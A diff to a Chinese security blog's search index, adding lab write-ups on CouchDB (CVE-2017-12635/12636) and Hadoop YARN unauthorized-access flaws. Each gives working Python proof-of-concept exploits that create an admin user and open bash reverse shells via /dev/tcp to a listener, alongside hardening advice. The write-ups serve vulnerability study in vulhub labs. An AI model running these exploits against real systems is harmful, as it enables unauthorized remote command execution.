@@ -1,6 +1,67 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Couchdb 未授权访问</title>
+    <url>/2023/05/17/Couchdb/</url>
+    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p>
+</div>
+
+<div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
+</div>
+
+<div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p>
+</div>
+
+<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
+</div>
+
+<div class="timeline purple"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
+</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-17</p>
+</div></div><div class='timeline-item-content'><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p>
+<p>CouchDB 默认在 5984 端口开放 Restful 的 API 接口，用于数据库的管理功能。其 HTTP Server 默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过 API 访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关 API 对服务器上的数据进行任意的增删改查，其中通过 API 修改 local.ini 配置文件，可进一步导致执行任意系统命令，获取服务器权限！</p>
+<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>使用 vulhub 搭建</p>
+<p>启动完成后，访问<code>http://your-ip:5984/</code>即可看到Couchdb的欢迎页面。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a><strong>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</strong></h3><p>任意用户创建</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">数据包中发送两个 roles 数据包，可绕过限制，建立用户</span><br><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;vulhub&quot;</span>,</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [<span class="string">&quot;_admin&quot;</span>],</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;vulhub&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a><strong>Couchdb 任意命令执行漏洞（CVE-2017-12636）</strong></h3><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。</p>
+<p><strong>利用条件</strong></p>
+<p>影响版本：小于 1.7.0 以及 小于 2.1.1</p>
+<p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>先增加一个管理员用户。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">利用方式</span><br><span class="line">使用msf模块：linux/http/apache_couchdb_cmd_exec</span><br><span class="line"></span><br><span class="line">poc 代码</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://your-ip/:5984&#x27;</span></span><br><span class="line"><span class="built_in">command</span> = rb<span class="string">&quot;&quot;</span><span class="string">&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">version = 1</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">&#x27;/_users/org.couchdb.user:wooyun&#x27;</span>, data=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;wooyun&quot;,</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="string">  &quot;password&quot;: &quot;wooyun&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">&#x27;wooyun&#x27;</span>, <span class="string">&#x27;wooyun&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> = <span class="string">&quot;bash -c &#x27;&#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span> % base64.b64encode(<span class="built_in">command</span>).decode()</span><br><span class="line"><span class="keyword">if</span> version == 1:</span><br><span class="line">    session.put(target + (<span class="string">&#x27;/_config/query_servers/cmd&#x27;</span>), data=json.dumps(<span class="built_in">command</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">&#x27;/_membership&#x27;</span>).json()[<span class="string">&#x27;all_nodes&#x27;</span>][0]</span><br><span class="line">    session.put(target + <span class="string">&#x27;/_node/&#123;&#125;/_config/query_servers/cmd&#x27;</span>.format(host), data=json.dumps(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun&#x27;</span>)</span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == 1:</span><br><span class="line">    session.post(target + <span class="string">&#x27;/wooyun/_temp_view?limit=10&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">&#x27;/wooyun/_design/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul>
+<li>指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 文件中找到 “bind_address &#x3D; 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</li>
+<li>设置访问密码 （需要重启CouchDB才能生效） 在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 中找到“[admins]”字段配置密码</li>
+</ul>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
+<li><a href="https://paper.seebug.org/409/#0x09-couchdb">https://paper.seebug.org/409/#0x09-couchdb</a></li>
+<li><a href="https://vulhub.org/#/environments/couchdb/CVE-2017-12636/">https://vulhub.org/#/environments/couchdb/CVE-2017-12636/</a></li>
+</ul>
+</div></div></div>
+
+<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
+</div>
+
+<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
+</div>
+
+]]></content>
+      <categories>
+        <category>未授权访问</category>
+        <category>Couchdb</category>
+      </categories>
+      <tags>
+        <tag>Couchdb</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ElasticSearch 未授权访问</title>
     <url>/2023/05/16/ElasticSearch/</url>
     <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p>
@@ -51,6 +112,69 @@
       </categories>
       <tags>
         <tag>ElasticSearch</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hadoop 未授权访问</title>
+    <url>/2023/05/17/Hadoop/</url>
+    <content><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>学习记录</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p>
+</div>
+
+<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
+</div>
+
+<div class="timeline orange"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
+</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-17</p>
+</div></div><div class='timeline-item-content'><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>由于服务器直接在开放了 Hadoop 机器 的多个 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p>
+<p>ResourceManager 默认端口8088   </p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用 vulhub 搭建靶场环境</p>
+<p>地址：<a href="https://vulhub.org/#/environments/hadoop/unauthorized-yarn/">https://vulhub.org/#/environments/hadoop/unauthorized-yarn/</a></p>
+<p>下载环境，进入漏洞环境目录执行：<code>docker-compose up -d</code> 启动安装启动环境</p>
+<p>环境启动后，访问<code>http://your-ip:8088</code>即可看到Hadoop YARN ResourceManager WebUI页面。</p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>调用 New Application API 创建 Application 进行代码注入，反弹shell。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><ul>
+<li>启动 msfconsole</li>
+<li>search hadoop</li>
+<li>use linux&#x2F;http&#x2F;hadoop_unauth_exec</li>
+<li>设置目标ip，本地监听ip</li>
+<li>exploit</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">py poc 代码</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.0.1&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul>
+<li>关闭hadoop web 管理页面</li>
+<li>开启身份验证，防止未授权用户访问</li>
+<li>设置防火墙安全组策略，禁止端口公网访问，限制可信ip</li>
+</ul>
+<h1 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h1><p><a href="https://vulhub.org/#/environments/hadoop/unauthorized-yarn/">https://vulhub.org/#/environments/hadoop/unauthorized-yarn/</a></p>
+<p><a href="https://paper.seebug.org/409/#0x08-hadoop">https://paper.seebug.org/409/#0x08-hadoop</a></p>
+</div></div></div>
+
+<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
+</div>
+
+<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
+</div>
+
+]]></content>
+      <categories>
+        <category>未授权访问</category>
+        <category>Hadoop</category>
+      </categories>
+      <tags>
+        <tag>Hadoop</tag>
       </tags>
   </entry>
   <entry>
@@ -517,6 +641,35 @@
 ]]></content>
   </entry>
   <entry>
+    <title>书籍</title>
+    <url>/books/index.html</url>
+    <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
+</div>
+
+]]></content>
+  </entry>
+  <entry>
     <title>  </title>
     <url>/archlinux/index.html</url>
     <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>arch linux 一个很棒的linux发行版</p>
@@ -577,35 +730,6 @@
   
 </div>
 
-
-]]></content>
-  </entry>
-  <entry>
-    <title>书籍</title>
-    <url>/books/index.html</url>
-    <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
-</div>
 
 ]]></content>
   </entry>
